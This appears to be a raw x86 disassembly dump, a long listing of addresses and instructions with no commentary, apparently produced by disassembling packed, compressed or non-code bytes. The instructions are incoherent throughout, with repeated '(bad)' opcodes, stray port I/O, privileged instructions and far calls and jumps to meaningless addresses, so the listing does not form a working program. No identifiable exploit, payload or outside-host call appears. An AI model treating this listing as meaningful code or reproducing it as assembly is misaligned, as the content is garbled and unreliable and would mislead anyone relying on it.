  415e76:	(bad)  
  415e77:	pop    esi
  415e78:	xchg   ebp,eax
  415e79:	pop    es
  415e7a:	ficom  WORD PTR [edi]
  415e7c:	jb     0x415eb8
  415e7e:	fsub   DWORD PTR [esi-0x3515679e]
  415e84:	sub    DWORD PTR [esi+0x4fdddf50],esi
  415e8a:	push   0x1b
  415e8c:	fs adc al,al
  415e8f:	sub    BYTE PTR [edx+ebp*8],0xf6
  415e93:	and    al,0xb4
  415e95:	xlat   BYTE PTR ds:[ebx]
  415e96:	leave  
  415e97:	push   DWORD PTR fs:[edx+ecx*8]
  415e9b:	add    BYTE PTR [eax-0x763b4721],0xaa
  415ea2:	pop    ebx
  415ea3:	push   ecx
  415ea4:	sahf   
  415ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ea6:	fs sub ebp,edi
  415ea9:	mov    eax,ds:0xd04220d1
  415eae:	jmp    0x415e72
  415eb0:	sub    eax,DWORD PTR [ebx+0x49]
  415eb3:	aaa    
  415eb4:	sub    ebp,esp
  415eb6:	ror    esi,cl
  415eb8:	ror    BYTE PTR [edx-0x2769a3ac],cl
  415ebe:	push   edi
  415ebf:	dec    ecx
  415ec0:	les    edi,FWORD PTR [ebp-0x2a]
  415ec3:	mov    cl,bh
  415ec5:	dec    ebp
  415ec6:	out    dx,eax
  415ec7:	pop    edx
  415ec8:	cmp    DWORD PTR [edi],ebp
  415eca:	and    BYTE PTR [ebx],cl
  415ecc:	jmp    0x415eaa
  415ece:	mov    eax,0xb530d060
  415ed3:	cld    
  415ed4:	pusha  
  415ed5:	mov    ecx,0x2dccab70
  415eda:	or     esp,edx
  415edc:	js     0x415ef4
  415ede:	sub    eax,0x3587159a
  415ee3:	push   es
  415ee4:	xor    al,0x7a
  415ee6:	xor    ah,ch
  415ee8:	jbe    0x415ed8
  415eea:	lds    ecx,FWORD PTR [esi+0x63]
  415eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eee:	xchg   ebx,eax
  415eef:	aad    0x4c
  415ef1:	out    0x32,eax
  415ef3:	jle    0x415e86
  415ef5:	or     DWORD PTR [ecx],eax
  415ef7:	pop    ds
  415ef8:	push   edi
  415ef9:	cmp    esi,DWORD PTR [edx+esi*4-0x27]
  415efd:	fist   WORD PTR [ecx+0x36]
  415f00:	mov    eax,ds:0x5fb2b34c
  415f05:	sub    BYTE PTR [edi+eax*8],dl
  415f08:	inc    esi
  415f09:	add    eax,0x7bc1a83a
  415f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f0f:	or     DWORD PTR [esp+ecx*4],edi
  415f12:	cmp    cl,BYTE PTR [edx+0x20e7f090]
  415f18:	push   eax
  415f19:	dec    ecx
  415f1a:	in     al,0x34
  415f1c:	repnz or al,dl
  415f1f:	push   ecx
  415f20:	sar    BYTE PTR [ebp-0x60],cl
  415f23:	inc    ebx
  415f24:	mov    eax,0x59becadb
  415f29:	mov    ds:0x4a76b3e3,al
  415f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f2f:	pop    esi
  415f30:	sbb    eax,0x3182b9d6
  415f35:	repnz inc esp
  415f37:	out    dx,eax
  415f38:	lock xor bl,BYTE PTR [edx-0x56]
  415f3c:	cwde   
  415f3d:	leave  
  415f3e:	jg     0x415f2b
  415f40:	mov    dl,0xf3
  415f42:	xchg   edx,eax
  415f43:	xchg   DWORD PTR [eax+0x31],eax
  415f46:	data16 adc al,0x51
  415f49:	lahf   
  415f4a:	mov    bh,0xb7
  415f4c:	rcl    DWORD PTR [ecx+0x60],1
  415f4f:	scas   eax,DWORD PTR es:[edi]
  415f50:	sbb    bl,BYTE PTR ds:0xc8207cd6
  415f56:	sub    edi,edx
  415f58:	xchg   ebp,eax
  415f59:	add    al,0x1
  415f5b:	pop    ecx
  415f5c:	aas    
  415f5d:	call   0x5831:0x65ef38b7
  415f64:	jmp    0x17d9a366
  415f69:	cs inc ecx
  415f6b:	in     eax,dx
  415f6c:	dec    ebp
  415f6d:	mov    esi,0xb5406ce4
  415f72:	pop    edi
  415f73:	outs   dx,DWORD PTR ds:[esi]
  415f74:	test   BYTE PTR [esi],ah
  415f76:	outs   dx,DWORD PTR ds:[esi]
  415f77:	mov    ebx,0x7a51c88b
  415f7c:	cmp    BYTE PTR [eax-0xcc7bd3c],0x32
  415f83:	ins    BYTE PTR es:[edi],dx
  415f84:	je     0x415f64
  415f86:	mov    ecx,0xc87ddcfa
  415f8b:	or     DWORD PTR [edx+0x36],esi
  415f8e:	pop    ebp
  415f8f:	aaa    
  415f90:	cmp    al,0x5
  415f92:	and    BYTE PTR [ebp+0x57],al
  415f95:	jge    0x415f7a
  415f97:	cmp    eax,0xc4fcba0f
  415f9c:	jl     0x415f8f
  415f9e:	mov    ss,WORD PTR [ebp-0x69471935]
  415fa4:	fcomp  DWORD PTR [esi]
  415fa6:	fucomp st(6)
  415fa8:	hlt    
  415fa9:	add    cx,ax
  415fac:	dec    esp
  415fad:	xchg   BYTE PTR es:[esi+esi*8-0x3e],dl
  415fb2:	cmp    BYTE PTR [edi+0x3f],cl
  415fb5:	sbb    eax,edi
  415fb7:	or     DWORD PTR [edx],ebp
  415fb9:	push   ecx
  415fba:	sbb    eax,0xf88a011a
  415fbf:	aas    
  415fc0:	inc    ebx
  415fc1:	inc    edi
  415fc2:	stos   BYTE PTR es:[edi],al
  415fc3:	xchg   ebp,eax
  415fc4:	mov    ebx,0x37982246
  415fc9:	xor    DWORD PTR [eax+0x7dbfd9b9],esi
  415fcf:	adc    DWORD PTR [edx-0x67ab4688],eax
  415fd5:	cdq    
  415fd6:	and    BYTE PTR [ecx-0x10],bl
  415fd9:	jb     0x415f9b
  415fdb:	retf   0x2ca8
  415fde:	repz les esp,FWORD PTR [ecx*4-0x2ccb145e]
  415fe6:	xor    esi,edi
  415fe8:	mov    dl,0xb6
  415fea:	sbb    eax,0xe8e5a1f0
  415fef:	adc    DWORD PTR [edi+0x63],0xffffffdd
  415ff3:	lahf   
  415ff4:	pop    ebx
  415ff5:	lock and al,0x39
  415ff8:	and    al,0xbf
  415ffa:	shr    DWORD PTR [ecx],cl
  415ffc:	call   0xc114:0x69ff7c04
  416003:	sbb    ah,BYTE PTR [ecx+0x40]
  416006:	and    esp,DWORD PTR [ebx]
  416008:	mov    ch,BYTE PTR [edx]
  41600a:	pop    ebx
  41600b:	lahf   
  41600c:	jbe    0x416065
  41600e:	ins    DWORD PTR es:[edi],dx
  41600f:	fld    DWORD PTR [ebp+eiz*1+0x39cc13ab]
  416016:	cld    
  416017:	dec    ecx
  416018:	(bad)  
  41601a:	dec    edi
  41601b:	in     al,dx
  41601c:	ret    0xa06a
  41601f:	inc    esp
  416020:	jne    0x416089
  416022:	push   es
  416023:	(bad)  
  416025:	call   0x28b3:0x2801bd4e
  41602c:	adc    DWORD PTR [ebx-0xf],eax
  41602f:	adc    esi,DWORD PTR [esi+esi*8+0x5]
  416033:	loope  0x416075
  416035:	pop    ds
  416036:	(bad)  
  416037:	add    edx,esi
  416039:	and    eax,0x9cf9d7c3
  41603e:	jecxz  0x41609a
  416040:	aam    0x61
  416042:	jno    0x416040
  416044:	addr16 inc ecx
  416046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416047:	mov    ch,0xeb
  416049:	dec    esi
  41604a:	cmp    al,0x87
  41604c:	(bad)  
  41604d:	cmp    al,0x61
  41604f:	std    
  416050:	ror    DWORD PTR [ebx+0x42fc18c7],1
  416056:	xchg   edx,eax
  416057:	mov    esp,ebx
  416059:	ja     0x4160ac
  41605b:	(bad)
  41605e:	sub    DWORD PTR [ecx+ebx*1+0x50d85b28],edi
  416065:	or     BYTE PTR [esi-0x6a],0xfe
  416069:	pop    eax
  41606a:	je     0x41601d
  41606c:	pop    ecx
  41606d:	mov    cl,0x7a
  41606f:	(bad)  
  416070:	jecxz  0x41603b
  416072:	xor    DWORD PTR [ebx-0x6737259a],ebp
  416078:	ja     0x41603a
  41607a:	xchg   esp,eax
  41607b:	push   edi
  41607c:	dec    eax
  41607d:	retf   
  41607e:	jae    0x41601f
  416080:	sbb    eax,0xaff4730
  416085:	fbstp  TBYTE PTR [ebx]
  416087:	sbb    eax,0xa34999a9
  41608c:	push   ebp
  41608d:	jne    0x4160eb
  41608f:	jne    0x41605a
  416091:	fld    TBYTE PTR [edx]
  416093:	dec    ebp
  416094:	sbb    eax,0x9036eb6e
  416099:	mov    ebx,0xcd72323b
  41609e:	mov    WORD PTR [esi+0x1b],es
  4160a1:	adc    ebp,DWORD PTR [ebp-0x6a]
  4160a4:	ins    BYTE PTR es:[edi],dx
  4160a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160a6:	sub    al,0x2a
  4160a8:	fs jmp 0x4185509a
  4160ae:	jecxz  0x416119
  4160b0:	shr    DWORD PTR [edx-0x5b86322d],cl
  4160b6:	jmp    0x5b0f:0x768d6aa6
  4160bd:	loop   0x4160a5
  4160bf:	imul   esp,edi,0xe494ee5e
  4160c5:	(bad)  
  4160c6:	mov    eax,0xc651333d
  4160cb:	fisttp DWORD PTR [ebx]
  4160cd:	fcomp  DWORD PTR [edx-0x56]
  4160d0:	jmp    0x4160e5
  4160d2:	xlat   BYTE PTR ds:[ebx]
  4160d3:	dec    esp
  4160d4:	fist   WORD PTR [edx-0x3c]
  4160d7:	scas   al,BYTE PTR es:[edi]
  4160d8:	fisub  WORD PTR [esi+0x1f5d763a]
  4160de:	dec    eax
  4160df:	fstp   DWORD PTR [edi+ecx*4]
  4160e2:	in     al,0xf6
  4160e4:	aaa    
  4160e5:	xlat   BYTE PTR ds:[ebx]
  4160e6:	mov    bl,0xd3
  4160e8:	sub    al,0x5d
  4160ea:	rol    BYTE PTR [edx+0x44f4b05f],0x8e
  4160f1:	push   cs
  4160f2:	arpl   cx,si
  4160f4:	test   eax,0xbcec635c
  4160f9:	test   BYTE PTR [edi],cl
  4160fb:	add    ebx,DWORD PTR [edi]
  4160fd:	adc    ebx,DWORD PTR [edi+edi*1+0x3613e18c]
  416104:	add    dh,BYTE PTR [ebx+0x6f]
  416107:	add    eax,0x8469d75c
  41610c:	retf   0xb3b1
  41610f:	ins    BYTE PTR es:[edi],dx
  416110:	in     al,dx
  416111:	jno    0x416103
  416113:	rol    DWORD PTR [ebx+esi*8],cl
  416116:	mov    ebx,0xda6f4be1
  41611b:	mov    DWORD PTR [ebp-0x64],ecx
  41611e:	dec    ebx
  41611f:	neg    DWORD PTR [ecx-0x10882849]
  416125:	sbb    DWORD PTR [ecx],esp
  416127:	shr    cl,1
  416129:	jmp    0xacb58ee
  41612e:	and    ebx,DWORD PTR [ebp+0x3e74da22]
  416134:	ficom  DWORD PTR [eax+0x59]
  416137:	in     eax,0x17
  416139:	sub    al,0x5e
  41613b:	mov    ebx,0x992846ca
  416140:	mov    edi,esp
  416142:	sar    BYTE PTR [esi-0x37e7808f],1
  416148:	inc    ebx
  416149:	pop    esi
  41614a:	scas   eax,DWORD PTR es:[edi]
  41614b:	mov    esp,0xb92cff10
  416150:	adc    eax,0x5147cc41
  416155:	adc    eax,0xc83b57c2
  41615a:	or     dh,BYTE PTR [eax]
  41615c:	or     DWORD PTR [edi],eax
  41615e:	sub    al,0xdd
  416160:	std    
  416161:	loop   0x4161a8
  416163:	mov    WORD PTR [esi],gs
  416165:	xor    BYTE PTR [ebp-0x2e01a366],al
  41616b:	adc    al,0x6e
  41616d:	in     al,dx
  41616e:	xchg   edi,eax
  41616f:	out    0x84,al
  416171:	ficom  DWORD PTR [esi]
  416173:	mov    al,0xf0
  416175:	adc    esi,DWORD PTR [esi-0x3da77da0]
  41617b:	xor    DWORD PTR [ebp-0x48],ecx
  41617e:	frstor [eax+0x2d1a81b1]
  416184:	(bad)  
  416185:	jmp    0xc364bb25
  41618a:	sti    
  41618b:	pop    ebx
  41618c:	lods   al,BYTE PTR ds:[esi]
  41618d:	enter  0x26ea,0x49
  416191:	inc    ebp
  416192:	pop    ss
  416193:	sar    DWORD PTR [ebx],0x19
  416196:	pop    ebp
  416197:	jae    0x4161e1
  416199:	jo     0x41611c
  41619b:	pop    esi
  41619c:	in     al,0x4f
  41619e:	jge    0x41619c
  4161a0:	pusha  
  4161a1:	rcl    BYTE PTR [ecx-0x74],1
  4161a4:	xor    eax,0xe351cc16
  4161a9:	cmp    ah,dl
  4161ab:	(bad)  
  4161ac:	mov    cl,0x6f
  4161ae:	push   ss
  4161af:	dec    esp
  4161b0:	out    0x1d,al
  4161b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b3:	hlt    
  4161b4:	or     eax,0x612622cb
  4161b9:	mov    BYTE PTR [eax+0x1e1dd1a0],bl
  4161bf:	aas    
  4161c0:	aad    0x84
  4161c2:	jbe    0x4161c2
  4161c4:	test   al,0xee
  4161c6:	verr   WORD PTR [ecx-0x31]
  4161ca:	sub    BYTE PTR [eiz*8+0x32c58eba],ch
  4161d1:	cmp    BYTE PTR [eax+0xd],bh
  4161d4:	pop    edx
  4161d5:	xchg   edi,eax
  4161d6:	nop    DWORD PTR [eax]
  4161d9:	in     al,0xb0
  4161db:	pop    edx
  4161dc:	jo     0x4161c8
  4161de:	ja     0x4161e1
  4161e0:	daa    
  4161e1:	jns    0x4161f8
  4161e3:	enter  0x99b0,0xd3
  4161e7:	cmp    DWORD PTR [esi],0xffffffd5
  4161ea:	mov    ah,0x9d
  4161ec:	xor    BYTE PTR [edx-0x38],0xe6
  4161f0:	jg     0x41619d
  4161f2:	ds push ss
  4161f4:	loope  0x41622a
  4161f6:	cmp    dh,dl
  4161f8:	inc    edi
  4161f9:	loope  0x41619d
  4161fb:	cmp    al,ah
  4161fd:	rcr    bh,0x6a
  416200:	and    edx,0x1eafa83c
  416206:	pop    ds
  416207:	sti    
  416208:	push   eax
  416209:	mov    ebp,DWORD PTR [edi+0x32ce365f]
  41620f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416210:	mov    ch,0x68
  416212:	jecxz  0x416259
  416214:	jne    0x416248
  416216:	push   0x16
  416218:	cmp    BYTE PTR [edx-0x1aada48f],dl
  41621e:	push   ecx
  41621f:	adc    bh,BYTE PTR [ebp+0x7d]
  416222:	test   eax,0xb62ca94b
  416227:	clc    
  416228:	ss dec esi
  41622a:	fst    st(6)
  41622c:	stc    
  41622d:	sti    
  41622e:	ret    
  41622f:	inc    edi
  416230:	or     ah,dh
  416232:	cwde   
  416233:	fwait
  416234:	in     eax,dx
  416235:	sub    DWORD PTR [ecx],edx
  416237:	fs (bad) 
  41623a:	imul   ecx,edx,0x3a
  41623d:	xlat   BYTE PTR ds:[ebx]
  41623e:	ja     0x4161d4
  416240:	popf   
  416241:	shr    DWORD PTR [edx+ecx*4+0x22],0x54
  416246:	out    0x6c,eax
  416248:	inc    edi
  416249:	mov    bh,0x26
  41624b:	lea    edx,[ebp+0x47]
  41624e:	xor    ah,BYTE PTR [ecx-0x55]
  416251:	cmp    al,0xf3
  416253:	xchg   BYTE PTR [ebx-0x31],dl
  416256:	stos   BYTE PTR es:[edi],al
  416257:	push   cs
  416258:	jmp    0x7106f060
  41625d:	xchg   esi,eax
  41625e:	cmp    dl,cl
  416260:	rcr    BYTE PTR [eax+0x1ccd4579],1
  416266:	jo     0x416228
  416268:	(bad)  
  416269:	(bad)  
  41626a:	out    0xeb,eax
  41626c:	xlat   BYTE PTR ds:[ebx]
  41626d:	cs pop edx
  41626f:	push   0xffffffd0
  416271:	into   
  416272:	inc    eax
  416273:	push   cs
  416274:	jg     0x416297
  416276:	aaa    
  416277:	sbb    ah,BYTE PTR [edi-0x1a]
  41627a:	mov    bl,0xcb
  41627c:	mov    WORD PTR [esi],es
  41627e:	jg     0x4162bc
  416280:	aad    0x1f
  416282:	pop    edx
  416283:	or     DWORD PTR [esi-0x41c2304d],ecx
  416289:	add    dl,BYTE PTR [eax+ebp*1]
  41628c:	jo     0x416261
  41628e:	mov    BYTE PTR [ebx-0x5e4acdc1],dh
  416294:	out    dx,al
  416295:	pop    ds
  416296:	jle    0x41624a
  416298:	jno    0x41628a
  41629a:	add    DWORD PTR [edx-0x16],esi
  41629d:	(bad)  
  41629f:	jno    0x4162e3
  4162a1:	jnp    0x416276
  4162a3:	push   ebp
  4162a4:	ret    0xb087
  4162a7:	xor    DWORD PTR [ecx+edi*4],ebx
  4162aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162ab:	enter  0x5fe9,0x21
  4162af:	or     eax,DWORD PTR [ebp+0x56]
  4162b2:	xchg   esp,eax
  4162b3:	mov    ecx,0x2117ded9
  4162b8:	mov    ?,esi
  4162ba:	sbb    BYTE PTR fs:[ecx],ah
  4162bd:	ja     0x4162db
  4162bf:	ss adc eax,0x83ad035e
  4162c5:	sbb    eax,0xb3a9afc1
  4162ca:	push   ss
  4162cb:	jle    0x4162d3
  4162cd:	fucomi st,st(5)
  4162cf:	dec    ecx
  4162d0:	iret   
  4162d1:	push   edx
  4162d2:	sbb    eax,0x28720e2e
  4162d7:	ret    
  4162d8:	test   al,dl
  4162da:	ins    BYTE PTR es:[edi],dx
  4162db:	in     eax,0xa4
  4162dd:	retf   
  4162de:	push   edx
  4162df:	dec    ebp
  4162e0:	xchg   esi,eax
  4162e1:	int    0x23
  4162e3:	into   
  4162e4:	les    ebp,FWORD PTR [edx+0x5fe31ff7]
  4162ea:	das    
  4162eb:	imul   esi,ecx,0x46
  4162ee:	inc    ebx
  4162ef:	push   ds
  4162f0:	adc    ecx,DWORD PTR [eax]
  4162f2:	xchg   esi,eax
  4162f3:	sbb    eax,0x6b029486
  4162f8:	outs   dx,BYTE PTR ds:[esi]
  4162f9:	lods   eax,DWORD PTR ds:[esi]
  4162fa:	adc    cl,0xaf
  4162fd:	push   ecx
  4162fe:	bnd jmp 0x2616bb4e
  416304:	xor    ecx,DWORD PTR [ecx-0x53]
  416307:	pop    eax
  416308:	bound  eax,QWORD PTR [eax-0x7283536f]
  41630e:	dec    edx
  41630f:	mov    BYTE PTR [esi+edi*2+0x311463a9],cl
  416316:	pop    ss
  416317:	sub    DWORD PTR [eax-0x7a273930],ecx
  41631d:	retf   0xf99d
  416320:	add    eax,0x6e8c49e3
  416325:	mov    edx,DWORD PTR ds:0xcd6a170f
  41632b:	xor    eax,0xe8c7ed62
  416330:	xor    DWORD PTR [ebx-0x4faee148],ecx
  416336:	add    bh,cl
  416338:	push   ebx
  416339:	adc    al,0x7f
  41633c:	mov    cl,0x8f
  41633e:	cmp    cl,BYTE PTR [eax]
  416340:	or     eax,0xe000fd3
  416345:	stc    
  416346:	test   DWORD PTR [ebx],esp
  416348:	test   esp,edi
  41634a:	loop   0x4162e1
  41634c:	retf   
  41634d:	mov    esp,0x7e0aa96e
  416352:	lds    esi,FWORD PTR [ebx]
  416354:	jle    0x4163b9
  416356:	pop    eax
  416357:	enter  0xeee9,0x50
  41635b:	mov    bl,0x61
  41635d:	fild   WORD PTR [esi+0x65c9b5d5]
  416363:	adc    al,0xa7
  416365:	sub    bl,BYTE PTR [esi+0x5e]
  416368:	das    
  416369:	mov    edi,0x67fa2f5
  41636e:	xchg   ah,al
  416370:	adc    eax,0xe508ac8f
  416375:	pop    es
  416376:	mov    esi,0xb2070a3a
  41637b:	mov    eax,ds:0x54bb35f4
  416380:	pop    ebx
  416381:	dec    ebx
  416382:	add    cl,ch
  416384:	sbb    al,0x5e
  416386:	imul   eax,DWORD PTR [eax-0x41],0xffffff99
  41638a:	dec    ecx
  41638b:	inc    ebp
  41638c:	adc    eax,0xbfd7f333
  416391:	shl    DWORD PTR [ebx+0x38],1
  416394:	sbb    eax,0x17524590
  416399:	pop    es
  41639a:	cwde   
  41639b:	pop    esi
  41639c:	pusha  
  41639d:	retf   0x46d
  4163a0:	test   eax,0x82880768
  4163a5:	dec    eax
  4163a6:	mov    ebp,0x4cc4719f
  4163ab:	mov    WORD PTR [ecx],?
  4163ad:	ss add bh,BYTE PTR fs:[esp+esi*1+0x57]
  4163b3:	add    DWORD PTR [ecx+0x75],edx
  4163b6:	(bad)  
  4163b7:	or     BYTE PTR [ecx-0x5f],ch
  4163ba:	adc    DWORD PTR ss:[edx-0x6c58f7da],ebx
  4163c1:	inc    edi
  4163c2:	and    al,0x10
  4163c4:	jg     0x416436
  4163c6:	mov    eax,ds:0x348725dc
  4163cb:	pop    edx
  4163cc:	call   0xa997140c
  4163d1:	mov    gs,WORD PTR [esi+0x67]
  4163d4:	mov    edi,0xabe553aa
  4163d9:	aam    0x7
  4163db:	in     al,0x1b
  4163dd:	addr16 clc 
  4163df:	add    DWORD PTR [ebx],edx
  4163e1:	aam    0xa
  4163e3:	mov    ds:0x216fcb9c,al
  4163e8:	inc    edx
  4163e9:	mov    ah,al
  4163eb:	scas   al,BYTE PTR es:[edi]
  4163ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163ed:	mov    BYTE PTR [ebx+edx*8+0x58],0xc4
  4163f2:	je     0x4163b4
  4163f4:	pop    ecx
  4163f5:	shr    DWORD PTR [eax],0xe2
  4163f8:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4163fa:	out    dx,eax
  4163fb:	test   BYTE PTR [ebx+0x60644afb],0xc7
  416402:	call   0xc09d32a8
  416407:	cs dec esp
  416409:	lahf   
  41640a:	mov    esi,0xc1951c7a
  41640f:	stc    
  416410:	arpl   di,ax
  416412:	pusha  
  416413:	mov    bh,0xb0
  416415:	(bad)  
  416417:	arpl   WORD PTR ds:0x7540b812,cx
  41641d:	xor    edx,DWORD PTR [edi+ebx*4-0x4e]
  416421:	or     BYTE PTR [eax+0x32e374e2],0xde
  416428:	and    BYTE PTR [ecx-0x2b],0x9f
  41642c:	xchg   ebx,eax
  41642d:	jae    0x416420
  41642f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416430:	pop    esp
  416431:	clc    
  416432:	fxch   st(5)
  416434:	rcl    BYTE PTR [ebx],cl
  416436:	je     0x416423
  416438:	xlat   BYTE PTR ds:[ebx]
  416439:	dec    eax
  41643a:	out    dx,eax
  41643b:	int3   
  41643c:	std    
  41643d:	lahf   
  41643e:	mov    dl,0x4b
  416440:	sti    
  416441:	mov    bl,0xf6
  416443:	lods   al,BYTE PTR ds:[esi]
  416444:	xor    eax,esp
  416446:	addr16 mov cl,0x51
  416449:	out    0x5e,eax
  41644b:	sub    al,bl
  41644d:	jp     0x4164ae
  41644f:	push   ds
  416450:	add    eax,0x3dd3d0d2
  416455:	(bad)  
  416456:	mov    ds:0x59c0a7e7,eax
  41645b:	imul   esp,DWORD PTR [edx],0x6a65aa43
  416461:	rol    BYTE PTR [ecx-0x516bf5af],cl
  416467:	adc    cl,al
  416469:	int3   
  41646a:	cld    
  41646b:	lahf   
  41646c:	fwait
  41646d:	xor    DWORD PTR [edx-0x6a9a366f],ebp
  416473:	inc    esp
  416474:	cmp    BYTE PTR [eax+0x25],cl
  416477:	sub    edx,DWORD PTR [edi]
  416479:	xchg   edx,eax
  41647a:	cmp    eax,0xd5a2738e
  41647f:	pop    es
  416480:	dec    ebp
  416481:	out    0xef,eax
  416483:	imul   edi,DWORD PTR [ebx+eax*4-0x4b],0x31596f58
  41648b:	loopne 0x416472
  41648d:	test   al,0xf6
  41648f:	add    edx,ebp
  416491:	xor    al,0xa5
  416493:	xchg   ebx,eax
  416494:	inc    esi
  416495:	data16 (bad) 
  416497:	ror    BYTE PTR [edx-0x43738c94],1
  41649d:	icebp  
  41649e:	in     al,dx
  41649f:	out    dx,al
  4164a0:	xchg   edi,eax
  4164a1:	fidivr DWORD PTR [ebx]
  4164a3:	(bad)  
  4164a4:	jmp    0x6d115861
  4164a9:	or     al,0xc7
  4164ab:	loop   0x416458
  4164ad:	sub    edi,ecx
  4164af:	pop    ds
  4164b0:	inc    ecx
  4164b1:	jp     0x41650b
  4164b3:	jbe    0x41643c
  4164b5:	push   cs
  4164b6:	in     al,0xa7
  4164b8:	mov    esp,0xaae57963
  4164bd:	out    0x3d,eax
  4164bf:	aaa    
  4164c0:	push   ecx
  4164c1:	jp     0x4164cd
  4164c3:	int3   
  4164c4:	or     al,BYTE PTR [ecx+0x40]
  4164c7:	imul   DWORD PTR ds:0x8f504736
  4164cd:	cmp    edx,DWORD PTR es:[ecx-0x3b]
  4164d1:	or     bh,al
  4164d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164d4:	sub    DWORD PTR [edx+0x32],ebx
  4164d7:	pop    edi
  4164d8:	out    0xf6,eax
  4164da:	jecxz  0x4164e5
  4164dc:	mov    al,0x4f
  4164de:	sbb    ecx,DWORD PTR [eax+0x4c]
  4164e1:	dec    ebx
  4164e2:	retf   
  4164e3:	dec    ebx
  4164e4:	jae    0x4164e1
  4164e6:	ds into 
  4164e8:	cli    
  4164e9:	repz or al,BYTE PTR [esi+esi*2-0x713068e2]
  4164f1:	adc    DWORD PTR [edi+0x74],esi
  4164f4:	leave  
  4164f5:	outs   dx,DWORD PTR ds:[esi]
  4164f6:	xchg   ecx,eax
  4164f7:	jl     0x416483
  4164f9:	and    ebx,edi
  4164fb:	fcmovnbe st,st(3)
  4164fd:	sahf   
  4164fe:	jmp    0x4164d3
  416500:	in     al,0xf1
  416502:	xchg   ebx,eax
  416503:	cli    
  416504:	mov    gs,ebx
  416506:	jg     0x4164c4
  416508:	push   edx
  416509:	mov    cl,0xcb
  41650b:	icebp  
  41650c:	daa    
  41650d:	adc    esp,esi
  41650f:	mov    edi,0x8ff7d1a0
  416514:	cmp    ecx,esp
  416516:	push   eax
  416517:	arpl   WORD PTR [eax-0x7af5e81d],cx
  41651d:	mov    bl,0x94
  41651f:	add    al,BYTE PTR [esi]
  416521:	dec    ebp
  416522:	imul   esp,edi,0xffffffab
  416525:	sub    al,0x9d
  416527:	xchg   edx,eax
  416528:	outs   dx,BYTE PTR ds:[esi]
  416529:	test   BYTE PTR [edx-0x3e],ah
  41652c:	mov    bl,0x1c
  41652e:	xchg   BYTE PTR [ebx],bh
  416530:	adc    BYTE PTR [ebx-0x52eda891],al
  416536:	and    al,BYTE PTR [ebp-0x2433fdc9]
  41653c:	inc    eax
  41653d:	pop    edx
  41653e:	jbe    0x416536
  416540:	jg     0x4164c7
  416542:	popa   
  416543:	clc    
  416544:	push   0xffffff85
  416546:	clc    
  416547:	sub    eax,0x2a15997d
  41654c:	xor    al,0x8d
  41654e:	nop
  41654f:	xor    eax,0x7fc73b0
  416554:	cmp    BYTE PTR [edx-0x28bdb5a9],ah
  41655a:	call   0x8ccc95c0
  41655f:	aam    0x61
  416561:	and    DWORD PTR [eax],esi
  416563:	fimul  WORD PTR [edi-0x1d]
  416566:	or     eax,0x18384103
  41656b:	int    0x86
  41656d:	int3   
  41656e:	push   ds
  41656f:	repz mov WORD PTR [eax-0x1],ss
  416573:	mov    ds:0x2a4b1e2b,al
  416578:	aaa    
  416579:	cli    
  41657a:	jb     0x4165c9
  41657c:	jo     0x41659a
  41657e:	or     DWORD PTR [edx+esi*4],edx
  416581:	out    dx,al
  416582:	data16 sbb al,0x5d
  416585:	cli    
  416586:	mov    eax,0xbb35239b
  41658b:	pop    esi
  41658c:	jno    0x41651e
  41658e:	ret    0x252f
  416591:	dec    edx
  416592:	es leave 
  416594:	xchg   ebp,eax
  416595:	xchg   dh,dl
  416597:	jge    0x4165c2
  416599:	push   ebx
  41659a:	sbb    BYTE PTR ds:0xac9707ff,0x2f
  4165a1:	jle    0x41660c
  4165a3:	mov    edx,0x940a7fe6
  4165a8:	fisubr WORD PTR [esi]
  4165aa:	or     ecx,ebp
  4165ac:	into   
  4165ad:	ja     0x416624
  4165af:	add    eax,0x18e275d1
  4165b4:	or     BYTE PTR [esi-0x61],ah
  4165b7:	out    0x62,al
  4165b9:	ja     0x41655d
  4165bb:	jo     0x41659e
  4165bd:	pop    es
  4165be:	lds    ebx,FWORD PTR [edi-0x15]
  4165c1:	dec    eax
  4165c2:	push   0x7c
  4165c4:	jne    0x416555
  4165c6:	or     dl,bh
  4165c8:	ss call 0xaa3e8873
  4165ce:	jmp    0x41658d
  4165d0:	pusha  
  4165d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165d2:	mov    edx,DWORD PTR [eax-0x21]
  4165d5:	jl     0x416616
  4165d7:	dec    edi
  4165d8:	sbb    esp,DWORD PTR [esi+0x7bf2eb54]
  4165de:	jmp    0x4165f8
  4165e0:	inc    esp
  4165e1:	add    DWORD PTR [edx],ebx
  4165e3:	mov    esi,0xdd9b48e5
  4165e8:	shl    BYTE PTR [ebx+0x8],cl
  4165eb:	dec    eax
  4165ec:	mov    ah,0x81
  4165ee:	jo     0x416599
  4165f0:	jns    0x4165c6
  4165f2:	pop    ecx
  4165f3:	sub    esp,DWORD PTR [ebp-0x2c72e64d]
  4165f9:	inc    edx
  4165fa:	add    al,0x14
  4165fc:	mov    ecx,0x408eb5ee
  416601:	add    bh,BYTE PTR [ebx+0x4e]
  416604:	add    al,0xbd
  416606:	stos   DWORD PTR es:[edi],eax
  416607:	fcom   DWORD PTR [edx-0x11]
  41660a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41660b:	mov    ch,0xef
  41660d:	in     eax,0x58
  41660f:	mov    bh,0x4f
  416611:	adc    ebx,edx
  416613:	mov    edx,0xadab6353
  416619:	cmp    edi,DWORD PTR [eax+ecx*2+0x17]
  41661d:	popf   
  41661e:	loopne 0x41662e
  416620:	inc    ecx
  416621:	push   ecx
  416622:	mov    al,0x52
  416624:	in     eax,dx
  416625:	jae    0x4165bf
  416627:	or     ch,bl
  416629:	lea    ecx,[ebx]
  41662b:	mov    ds:0xf500e066,al
  416630:	push   0xc2631f39
  416635:	aaa    
